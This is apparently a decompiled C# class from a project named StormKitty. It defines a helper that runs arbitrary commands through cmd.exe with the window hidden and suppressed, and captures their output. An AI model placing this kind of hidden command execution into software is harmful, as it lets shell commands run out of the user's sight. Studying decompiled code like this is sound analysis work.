﻿using System;
using System.Diagnostics;

namespace StormKitty
{
	// Token: 0x0200005F RID: 95
	internal sealed class CommandHelper
	{
		// Token: 0x0600015B RID: 347 RVA: 0x0000A1F0 File Offset: 0x000083F0
		public static string Run(string cmd, bool wait = true)
		{
			string result = "";
			using (Process process = new Process())
			{
				process.StartInfo = new ProcessStartInfo
				{
					UseShellExecute = false,
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = cmd,
					RedirectStandardError = true,
					RedirectStandardOutput = true
				};
				process.Start();
				result = process.StandardOutput.ReadToEnd();
				if (wait)
				{
					process.WaitForExit();
				}
			}
			return result;
		}
	}
}
